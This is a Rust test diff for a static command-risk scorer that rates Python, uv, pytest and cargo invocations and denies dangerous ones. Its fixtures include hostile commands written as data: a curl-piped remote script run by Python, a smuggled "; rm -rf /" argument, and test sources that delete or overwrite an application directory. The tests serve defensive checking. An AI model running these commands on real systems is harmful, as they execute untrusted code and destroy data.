@@ -24,6 +24,381 @@ fn score(command: &str, cwd: &std::path::Path, config: &Config) -> Report {
 fn report(command: &str) -> Report {
     score(command, std::path::Path::new("/tmp"), &Config::default())
 }
+
+#[test]
+fn python_interpreter_flags_and_source_boundaries_have_consistent_coverage() {
+    let f = Fixture::new();
+    f.write("smoke.py", "print(1)\n");
+    f.write("extensionless", "print(1)\n");
+    f.write("app/__main__.py", "print(1)\n");
+    f.write("run_tests.py", "import unittest\nclass Probe(unittest.TestCase):\n    def test_value(self):\n        self.assertEqual(2+2, 4)\nif __name__ == '__main__':\n    unittest.main()\n");
+    assert_eq!(
+        f.report("python3 -IB run_tests.py").impact_severity,
+        Some(Severity::High)
+    );
+    assert_eq!(
+        f.report("uv run --no-sync python run_tests.py")
+            .impact_severity,
+        Some(Severity::High)
+    );
+    assert_eq!(
+        f.report("python3 -I -S -c 'assert 2 + 2 == 4'")
+            .impact_severity,
+        Some(Severity::Low)
+    );
+    assert_eq!(
+        f.report("python3 -c 'assert dangerous()'").impact_severity,
+        None
+    );
+    for command in [
+        "python3 -I -S -c 'print(1)'",
+        "python3 -IBuc 'print(1)'",
+        "python3 -c'print(1)'",
+        "python3 -W ignore -X dev smoke.py",
+        "python3 -Wignore -Xutf8=1 smoke.py",
+        "python3 -- smoke.py",
+        "python3 extensionless",
+        "python3 app",
+        "python3 -c 'print(1)' -m pip install thing",
+        "python3 -IB - <<'PY'\nprint(1)\nPY",
+    ] {
+        let r = f.report(command);
+        assert_eq!(
+            r.impact_severity,
+            Some(Severity::Low),
+            "{command}: {:?}",
+            r.unknowns
+        );
+        assert_eq!(
+            r.coverage.summary,
+            CoverageSummary::StaticAccounted,
+            "{command}: {:?}",
+            r.unknowns
+        );
+        assert!(!rule(&r, "package.install"));
+    }
+    for command in [
+        "python3 -i -c 'print(1)'",
+        "python3 -Xpresite=payload -c 'print(1)'",
+        "python3 -Wignore::payload.CustomWarning -c 'print(1)'",
+        "python3 --unmodeled-option smoke.py",
+    ] {
+        let r = f.report(command);
+        assert!(r.severity >= Severity::High, "{command}");
+        assert_ne!(r.coverage.summary, CoverageSummary::StaticAccounted);
+    }
+}
+
+#[test]
+fn python_and_uv_wrappers_preserve_source_hazards_and_stdin() {
+    let f = Fixture::new();
+    let source = "from pathlib import Path; Path('/Applications/DistillProbe.app/payload').write_text('fixture')";
+    f.write("probe.py", source);
+    for command in [
+        "python3 -I -S probe.py".to_owned(),
+        "python3 -Wignore -Xdev probe.py".into(),
+        ".venv/bin/python -I probe.py".into(),
+        "uv run python probe.py".into(),
+        "uv run --no-sync probe.py".into(),
+        "uv run --script probe.py".into(),
+        "uv run --no-sync python -I -S probe.py".into(),
+        format!("python3 -IBc \"{source}\""),
+        format!("uv run python -IB - <<'PY'\n{source}\nPY"),
+        "uv run -- https://example.invalid/probe.py".into(),
+        "curl https://example.invalid/probe.py | python3 -IB -".into(),
+    ] {
+        let r = f.report(&command);
+        assert_eq!(
+            r.impact_severity,
+            Some(Severity::Critical),
+            "{command}: {:?}",
+            r.unknowns
+        );
+        assert_eq!(r.decision, Decision::Deny);
+    }
+    assert!(
+        !f.0.join(".venv").exists(),
+        "candidate uv commands must never execute"
+    );
+}
+
+#[test]
+fn uv_run_models_environment_changes_without_turning_argv_into_shell_source() {
+    let f = Fixture::new();
+    f.write("smoke.py", "print(1)\n");
+    for (command, expected) in [
+        ("uv run python smoke.py", Severity::Medium),
+        ("uv run --no-sync python -I -S smoke.py", Severity::Low),
+        (
+            "uv --offline run --locked python smoke.py",
+            Severity::Medium,
+        ),
+        ("uv venv .venv", Severity::Medium),
+        ("uv run --with pytest python smoke.py", Severity::High),
+        ("uvx --from pytest pytest -q", Severity::High),
+        ("uv tool run --from pytest pytest -q", Severity::High),
+        (
+            "uv run --no-sync python -c 'print(1)' '; rm -rf /'",
+            Severity::Low,
+        ),
+    ] {
+        let r = f.report(command);
+        assert_eq!(
+            r.impact_severity,
+            Some(expected),
+            "{command}: {:?}",
+            r.unknowns
+        );
+        assert_ne!(
+            r.coverage.summary,
+            CoverageSummary::StaticAccounted,
+            "uv discovery is conditional"
+        );
+        assert!(r.severity >= Severity::High);
+    }
+    let unknown = f.report("uv run --unknown-option python smoke.py");
+    assert_ne!(unknown.coverage.summary, CoverageSummary::StaticAccounted);
+    assert!(unknown.severity >= Severity::High);
+    let rewritten = f.report("printf payload > smoke.py && uv run --no-sync python smoke.py");
+    assert!(
+        rewritten
+            .unknowns
+            .iter()
+            .any(|reason| reason.contains("modified earlier"))
+    );
+}
+
+#[test]
+fn uv_directory_and_project_options_have_different_path_semantics() {
+    let f = Fixture::new();
+    f.write("probe.py", "print(1)\n");
+    f.write(
+        "other/probe.py",
+        "import shutil\nshutil.rmtree('/Applications/DistillProbe.app')\n",
+    );
+    for command in [
+        "uv run --project other python probe.py",
+        "uv --directory other run --directory . python probe.py",
+    ] {
+        assert_ne!(
+            f.report(command).impact_severity,
+            Some(Severity::Critical),
+            "{command}"
+        );
+    }
+    for command in [
+        "uv run --directory other python probe.py",
+        "uv --directory other run python probe.py",
+    ] {
+        assert_eq!(
+            f.report(command).impact_severity,
+            Some(Severity::Critical),
+            "{command}"
+        );
+    }
+}
+
+#[test]
+fn python_test_runners_inspect_selected_sources_conftest_and_report_outputs() {
+    let f = Fixture::new();
+    let help = f.report("pytest --help");
+    assert_eq!(help.impact_severity, Some(Severity::Low));
+    assert!(help.severity >= Severity::High);
+    assert_ne!(help.coverage.summary, CoverageSummary::StaticAccounted);
+    f.write(
+        "tests/test_probe.py",
+        "import shutil\ndef test_probe():\n    shutil.rmtree('/Applications/DistillProbe.app')\n",
+    );
+    for command in [
+        "pytest -q tests",
+        "pytest -s -q tests/test_probe.py::test_probe",
+        "python3 -Impytest -q tests",
+        "python3 -m unittest discover -s tests -p 'test_*.py'",
+        "python3 -m unittest tests.test_probe",
+        "uv run --no-sync -m pytest -q tests",
+        "uvx pytest -q tests",
+        "uv tool run pytest -q tests",
+    ] {
+        let r = f.report(command);
+        assert_eq!(
+            r.impact_severity,
+            Some(Severity::Critical),
+            "{command}: {:?}",
+            r.unknowns
+        );
+        assert!(!r.inspected_files.is_empty());
+    }
+    f.write(
+        "tests/test_probe.py",
+        "def test_probe():\n    assert 1 == 1\n",
+    );
+    assert_eq!(
+        f.report("pytest -k 'rm -rf /' tests").impact_severity,
+        Some(Severity::High)
+    );
+    assert_eq!(
+        f.report("uv run -m pytest --junitxml /Applications/DistillProbe.app/report.xml tests")
+            .impact_severity,
+        Some(Severity::Critical)
+    );
+    assert_eq!(f.report("uv run -m pytest --cov=. --cov-report=xml:/Applications/DistillProbe.app/coverage.xml tests").impact_severity, Some(Severity::Critical));
+    assert_eq!(
+        f.report("uv format /Applications/DistillProbe.app/source.py")
+            .impact_severity,
+        Some(Severity::Critical)
+    );
+    f.write(
+        "conftest.py",
+        "import shutil\nshutil.rmtree('/Applications/DistillProbe.app')\n",
+    );
+    assert_eq!(
+        f.report("python3 -m pytest tests/test_probe.py")
+            .impact_severity,
+        Some(Severity::Critical)
+    );
+    assert_eq!(
+        f.report("pytest --noconftest tests/test_probe.py")
+            .impact_severity,
+        Some(Severity::High)
+    );
+    assert_eq!(
+        f.report("pytest --confcutdir tests tests/test_probe.py")
+            .impact_severity,
+        Some(Severity::High)
+    );
+}
+
+#[test]
+fn cargo_workflows_have_known_effects_and_format_check_does_not_claim_writes() {
+    let f = Fixture::new();
+    f.write("Cargo.toml", "[package]\nname='fixture'\nversion='0.1.0'\n");
+    f.write("src/main.rs", "fn main() { println!(\"fixture\"); }\n");
+    for command in [
+        "cargo build --offline",
+        "cargo check --locked",
+        "cargo clippy --all-targets -- -D warnings",
+        "cargo test --no-run",
+    ] {
+        let r = f.report(command);
+        assert_eq!(
+            r.impact_severity,
+            Some(Severity::Medium),
+            "{command}: {:?}",
+            r.unknowns
+        );
+        assert_ne!(r.coverage.summary, CoverageSummary::StaticAccounted);
+        assert!(
+            !r.behaviors
+                .iter()
+                .any(|b| b.operation == "Cargo executes project binaries or test harnesses")
+        );
+    }
+    for command in [
+        "cargo test --workspace -- --nocapture",
+        "cargo run --release -- --flag",
+        "cargo bench",
+    ] {
+        assert_eq!(
+            f.report(command).impact_severity,
+            Some(Severity::High),
+            "{command}"
+        );
+    }
+    let check = f.report("cargo fmt --all -- --check");
+    assert_eq!(check.impact_severity, Some(Severity::Low));
+    assert!(!effect(&check, EffectKind::FileWrite));
+    assert_eq!(
+        f.report("cargo fmt --all").impact_severity,
+        Some(Severity::Medium)
+    );
+}
+
+#[test]
+fn cargo_virtual_workspaces_and_custom_targets_keep_nested_hazards() {
+    let f = Fixture::new();
+    f.write("Cargo.toml", "[workspace]\nmembers=['crates/*']\n");
+    f.write(
+        "crates/probe/Cargo.toml",
+        "[package]\nname='probe'\nversion='0.1.0'\nbuild='build/custom.rs'\n",
+    );
+    f.write(
+        "crates/probe/build/custom.rs",
+        "fn main() { std::fs::write(\"/Applications/DistillProbe.app/payload\", b\"x\"); }\n",
+    );
+    for command in [
+        "cargo build --workspace",
+        "cargo test --workspace",
+        "cargo check --offline",
+    ] {
+        let r = f.report(command);
+        assert_eq!(
+            r.impact_severity,
+            Some(Severity::Critical),
+            "{command}: {:?}",
+            r.unknowns
+        );
+        assert!(
+            r.inspected_files
+                .iter()
+                .any(|file| file.path.ends_with("build/custom.rs"))
+        );
+    }
+}
+
+#[test]
+fn large_build_sources_retain_partial_coverage_without_spending_the_entire_shared_budget() {
+    let f = Fixture::new();
+    f.write(
+        "Cargo.toml",
+        "[package]\nname='large-fixture'\nversion='0.1.0'\n",
+    );
+    let source = format!("fn main() {{ {} }}", "let value = 1;".repeat(2000));
+    f.write("src/main.rs", &source);
+    let r = f.report("cargo build --offline");
+    assert_eq!(r.impact_severity, Some(Severity::Medium));
+    assert_eq!(r.coverage.summary, CoverageSummary::Partial);
+    assert!(
+        r.unknowns
+            .iter()
+            .any(|reason| reason.contains("reserved inspection budget"))
+    );
+}
+
+#[test]
+fn uv_auxiliary_commands_and_local_build_backends_have_explicit_effects() {
+    let f = Fixture::new();
+    f.write("smoke.py", "print(1)\n");
+    for (command, expected) in [
+        ("uv cache dir", Severity::Low),
+        ("uv cache prune", Severity::Medium),
+        ("uv python list", Severity::Low),
+        ("uv python find", Severity::Low),
+        ("uv python install 3.13", Severity::High),
+        ("uv python uninstall 3.13", Severity::High),
+        ("uv tool list", Severity::Low),
+        ("uv lock --check", Severity::Low),
+        ("uv run --no-project python smoke.py", Severity::Low),
+    ] {
+        assert_eq!(
+            f.report(command).impact_severity,
+            Some(expected),
+            "{command}"
+        );
+    }
+    f.write(
+        "pyproject.toml",
+        "[build-system]\nrequires=[]\nbuild-backend='builder'\nbackend-path=['backend']\n",
+    );
+    f.write("backend/builder.py", "from pathlib import Path\nPath('/Applications/DistillProbe.app/payload').write_text('fixture')\n");
+    assert_eq!(
+        f.report("uv run python smoke.py").impact_severity,
+        Some(Severity::Critical)
+    );
+    assert_ne!(
+        f.report("uv run --no-sync python smoke.py").impact_severity,
+        Some(Severity::Critical)
+    );
+}
 fn effect(r: &Report, kind: EffectKind) -> bool {
     r.effects.iter().any(|e| e.kind == kind)
 }
